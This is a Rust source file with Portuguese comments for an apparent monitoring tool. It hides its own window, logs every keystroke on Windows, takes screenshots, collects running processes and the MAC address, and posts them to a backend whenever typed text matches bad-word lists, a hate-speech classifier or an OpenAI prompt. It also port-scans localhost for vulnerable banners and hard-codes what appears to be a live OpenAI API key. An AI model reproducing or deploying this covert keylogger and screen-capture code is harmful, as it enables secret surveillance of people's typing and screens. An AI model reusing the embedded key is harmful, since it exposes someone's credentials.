use std::sync::mpsc::{channel, Receiver};
use std::thread;
use std::time::Duration;
use reqwest;
use std::fs::File;
use serde_json::{json, Value};
use std::io::Write;
use std::collections::HashMap;
use std::io::prelude::*;
use std::process::Command;
use reqwest::header::HeaderMap;
extern crate winapi;

use std::ptr;
use std::mem;
use std::ffi::OsString;
use winapi::um::tlhelp32::*;
use winapi::um::winnt::*;
use winapi::um::handleapi::*;
use winapi::um::processthreadsapi::*;
use winapi::um::psapi::*;
extern crate mac_address;

use image::RgbaImage;
use win_screenshot::prelude::capture_display;
use image::{DynamicImage, GenericImageView};
use base64::{encode, decode};
use mac_address::get_mac_address;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::{Arc, Mutex};
use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::runtime::Runtime;


async fn main_async() -> Result<(), Box<dyn std::error::Error>> {
    println!("Iniciou o programa!");
    if let Err(err) = update_aux_data().await {
        eprintln!("Erro ao atualizar dados auxiliares: {:?}", err);
    }

    let scanner_handle = thread::spawn(|| {
        println!("Iniciou a thread scanner_handle");
        let rt = Runtime::new().unwrap();
        rt.block_on(process_scan_results());
    });

    let keylogger_handle = thread::spawn(|| {
        println!("Iniciou a thread keylogger_handle");
        let rt = Runtime::new().unwrap();
        rt.block_on(keylogger());
    });

    scanner_handle.join().unwrap();
    keylogger_handle.join().unwrap();

    loop {
        // Resto do código...

        // Aguardar um intervalo
        thread::sleep(Duration::from_secs(1));
    }
}

fn main() {
    let _ = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2) // Defina o número de threads Tokio
        .enable_all() // Ative todos os recursos do Tokio
        .build()
        .unwrap()
        .block_on(main_async());
}

// Max IP Port.
const MAX: u16 = 9000;

async fn scan(target: &str, port: u16) -> Option<u16> {
    let addr = format!("{}:{}", target, port);
    match TcpStream::connect(&addr).await {
        Ok(mut stream) => {
            let mut buffer = vec![0; 1024];
            match banner(&mut stream, &mut buffer).await {
                Ok(banner) => {
                    if !banner.is_empty() {
                        Some(port)
                    } else {
                        None
                    }
                }
                Err(_) => None,
            }
        }
        Err(_) => None,
    }
}

async fn banner(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<String, std::io::Error> {
    let n = stream.read(buffer).await?;
    Ok(String::from_utf8_lossy(&buffer[0..n]).to_string())
}

async fn process_scan_results() {
    let vulnerability_file = std::fs::read_to_string("C:\\keyLogger\\vulnerable_banners.txt").unwrap_or_default();

    for port in 1..=MAX {
        if let Some(open_port) = scan("localhost", port).await {
            let addr = format!("localhost:{}", open_port);
            match TcpStream::connect(&addr).await {
                Ok(mut stream) => {
                    let mut buffer = vec![0; 1024];
                    if let Ok(banner) = banner(&mut stream, &mut buffer).await {
                        if vulnerability_file.contains(&banner) {
                            let log_msg = format!("[!] Vulnerability found: {} at port {}\n", banner, open_port);
                            println!("{}", log_msg);
                            send_alert(log_msg.as_str()).await;
                        }
                    }
                }
                Err(_) => {}
            }
        }
    }
}

async fn keylogger() {
    stealth();
    let mut log = String::new();

    loop {
        for i in 8..190 {
            if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
                let key: String = match i as u32 {
                    32 => " ".into(),
                    8 => "[Backspace]".into(),
                    13 => "\n".into(),
                    190 | 110 => ".".into(),
                    _ => (i as u8 as char).to_string(),
                };
                log.push_str(&key);
            }
        }

        // Verifica se a tecla Enter foi pressionada corretamente
        let enter_pressed = unsafe {
            user32::GetAsyncKeyState(13) & 0x8000u16 as i16 != 0
        };

        if enter_pressed {
            if !log.is_empty() {
                report(&log);
                log.clear();
            }
        }

        // Aguarde um curto período para evitar uso excessivo da CPU
        thread::sleep(Duration::from_millis(10));
    }
}

fn stealth() {
    unsafe {
        kernel32::AllocConsole();
        let stealth = user32::FindWindowA(
            ptr::null_mut(),
            ptr::null(),
        );
        user32::ShowWindow(stealth, 0);
    }
}

fn sniffer(tx: std::sync::mpsc::Sender<String>) {
    // Resto do código...
}


async fn update_aux_data() -> Result<(), Box<dyn std::error::Error>> {
    // Fazer login e obter o token
    let token = match do_login().await {
        Ok(token) => token,
        Err(err) => {
            eprintln!("Erro ao fazer login: {:?}", err);
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::Other,
                "Falha ao fazer login.",
            )));
        }
    };

    let client = reqwest::Client::new();

    // Atualizar a lista de palavras proibidas (badLanguage)
    let bad_languages = client.get("http://localhost:8091/language")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let bad_languages_text = bad_languages.text().await?;
    let mut bad_language_file = tokio::fs::File::create(r"C:\keyLogger\badLanguage.txt").await?;
    tokio::io::AsyncWriteExt::write_all(&mut bad_language_file, bad_languages_text.as_bytes()).await?;

    // Atualizar a lista de banners vulneráveis (vulnerable_banners)
    let vulnerable_banners = client.get("http://localhost:8091/port")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let vulnerable_banners_text = vulnerable_banners.text().await?;
    let mut vulnerable_banners_file = tokio::fs::File::create(r"C:\keyLogger\vulnerable_banners.txt").await?;
    tokio::io::AsyncWriteExt::write_all(&mut vulnerable_banners_file, vulnerable_banners_text.as_bytes()).await?;

    // Atualizar a lista de processos maliciosos (maliciousProcess)
    let malicious_processes = client.get("http://localhost:8091/process")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let malicious_processes_text = malicious_processes.text().await?;
    let mut malicious_processes_file = tokio::fs::File::create(r"C:\keyLogger\maliciousProcess.txt").await?;
    tokio::io::AsyncWriteExt::write_all(&mut malicious_processes_file, malicious_processes_text.as_bytes()).await?;

    // Atualizar a lista de sites bloqueados (sites)
    let blocked_sites = client.get("http://localhost:8091/website")
        .header("Authorization", format!("Bearer {}", token))
        .send()
        .await?;
    let blocked_sites_text = blocked_sites.text().await?;
    let mut blocked_sites_file = tokio::fs::File::create(r"C:\keyLogger\sites.txt").await?;
    tokio::io::AsyncWriteExt::write_all(&mut blocked_sites_file, blocked_sites_text.as_bytes()).await?;

    Ok(())
}

async fn do_login() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::Client::new();
    let login_data = json!({"login": "string", "password": "string"});

    // Fazer login e obter o token
    let response = client
        .post("http://localhost:8091/login")
        .json(&login_data)
        .send()
        .await?;

    if response.status() != reqwest::StatusCode::OK {
        let error_message = format!("Falha ao fazer login. Status: {}", response.status());
        return Err(Box::new(std::io::Error::new(std::io::ErrorKind::Other, error_message)));
    }

    let token = response.text().await?;
    Ok(token)
}

fn get_shift_chars() -> HashMap<&'static str, char> {
    let mut shift_chars = HashMap::new();
    shift_chars.insert("Shift + 1", '!');
    shift_chars.insert("Shift + 2", '@');
    shift_chars.insert("Shift + 3", '#');
    // Adicione outros caracteres aqui, se necessário
    shift_chars
}

async fn is_hate_speech(log: &str) -> bool {
    let data_logs = json!({"valor": 0, "frase": log});
    let client = reqwest::Client::new();
    let res = client
        .post("http://127.0.0.1:5000/predict")
        .json(&data_logs)
        .send()
        .await;

    if let Ok(response) = res {
        if response.status() == reqwest::StatusCode::OK {
            let hate_speech: Vec<HashMap<String, i32>> = response.json().await.unwrap_or_default();

            if let Some(hate_speech_json) = hate_speech.get(0) {
                if let Some(valor) = hate_speech_json.get("valor") {
                    if *valor == 1 {
                        println!("Geração de alerta por discurso de ódio: {}", log);
                        println!("{:?}", hate_speech_json);
                        return true;
                    }
                }
            }
        }
    }

    false
}


async fn verifyng_hate_speech_chatGPT(text: &str) -> bool {
    let openai_api_key = "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";
    let prompt = format!(
        r#"Identifique se essa frase tem discurso de ódio: "{}". Responda com sim ou não"#,
        text
    );
    let request_body = json!({
        "model": "text-davinci-003",
        "prompt": prompt,
        "temperature": 0.6,
    });

    let client = reqwest::Client::new();

    match client
        .post("https://api.openai.com/v1/engines/text-davinci-003/completions")
        .header("Authorization", format!("Bearer {}", openai_api_key))
        .json(&request_body)
        .send()
        .await
    {
        Ok(response) => {
            if let Ok(body) = response.json::<HashMap<String, Vec<HashMap<String, String>>>>().await {
                if let Some(choices) = body.get("choices") {
                    if !choices.is_empty() {
                        if let Some(text) = choices[0].get("text") {
                            if text.to_lowercase().starts_with("sim") {
                                println!("Geração de alerta por discurso de ódio no ChatGPT: {}", text);
                                return true;
                            }
                        }
                    }
                }
            }
        }
        Err(_) => {
            println!("ChatGPT está off!");
        }
    }

    false
}

fn is_bad_language(log: &str) -> bool {
    let log_tokenized = log.split_whitespace();
    if let Ok(file_contents) = std::fs::read_to_string(r"C:\keyLogger\badLanguage.txt") {
        let bad_words: Vec<&str> = file_contents.split(';').collect();
        for word in log_tokenized {
            if bad_words.contains(&word.to_lowercase().as_str()) {
                println!("Palavra que gerou o alerta: {}", word);
                return true;
            }
        }
    }

    false
}

fn are_malicious_process(log: &str) -> bool {
    if let Ok(file_contents) = std::fs::read_to_string(r"C:\keyLogger\maliciousProcess.txt") {
        let malicious_processes: Vec<&str> = file_contents.split(';').collect();
        for line in log.lines() {
            for proc in malicious_processes.iter() {
                if line.to_lowercase().contains(&proc.to_lowercase()) {
                    println!("Alerta gerado por causa do processo: {}", proc);
                    return true;
                }
            }
        }
    }

    false
}

fn get_mac_as_string() -> String {
    match get_mac_address() {
        Ok(Some(mac)) => mac.to_string(),
        _ => "MAC Address not found".to_string(),
    }
}

fn get_process() -> String {
    let mut process_names = Vec::new();

    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
    process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;

    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if snapshot == INVALID_HANDLE_VALUE {
        println!("Error: CreateToolhelp32Snapshot failed");
        return "".to_string();
    }

    if unsafe { Process32First(snapshot, &mut process_entry) } == 1 {
        while unsafe { Process32Next(snapshot, &mut process_entry) } == 1 {
            let process_name = unsafe {
                let mut len = 0;
                while process_entry.szExeFile[len] != 0 {
                    len += 1;
                }
                let bytes = &process_entry.szExeFile[0..len] as *const _ as *const u8;
                String::from_utf8_lossy(std::slice::from_raw_parts(bytes, len))
            };

            process_names.push(process_name.to_string());
        }
    }

    unsafe {
        CloseHandle(snapshot);
    }

    process_names.join(",")
}


fn get_image() -> String {
    let buf = capture_display().unwrap();
    let img = DynamicImage::ImageRgba8(RgbaImage::from_raw(buf.width, buf.height, buf.pixels).unwrap());

    let resized_img = img.resize(800, 600, image::imageops::FilterType::Lanczos3);

    resized_img.save("screenshot.png").unwrap();

    let mut file = File::open("screenshot.png").unwrap();
    let mut image_data = Vec::new();
    file.read_to_end(&mut image_data).unwrap();
    let encoded_image = encode(&image_data);

    encoded_image
}

async fn send_alert(log: &str) -> Result<(), Box<dyn std::error::Error>> {
    let token = do_login().await?;
    let mut headers = HeaderMap::new();
    headers.insert("Authorization", format!("Bearer {}", token).parse()?);

    let image_data = get_image();

    let client = reqwest::Client::new();
    
    // Construir o objeto ImageData na requisição.
    let image_response = client
        .post("http://localhost:8091/image/save")
        .headers(headers.clone())
        .json(&json!({
            "id": 0,
            "productImg": log,
            "base64Img": image_data,
        }))
        .send()
        .await?;

    let image_json: serde_json::Value = image_response.json().await?;
    let image_id = image_json.get("id").and_then(|id| id.as_i64()).unwrap_or(0);

    // Construir o objeto AlertData na requisição.
    let alert_response = client
        .post("http://localhost:8091/alert/save")
        .headers(headers)
        .json(&json!({
            "pcId": get_mac_as_string(),
            "imagem": {
                "id": image_id
            },
            "processos": get_process(),
        }))
        .send()
        .await?;

    println!("{:?}", alert_response);
    println!("Alert Saved!");
    Ok(())
}

async fn report(log: &str) -> Result<(), Box<dyn std::error::Error>> {
    if is_hate_speech(log).await || is_bad_language(log) || are_malicious_process(log) || verifyng_hate_speech_chatGPT(log).await {
        println!("Foi enviado o report!");
        send_alert(log).await?;
    }
    Ok(())
}
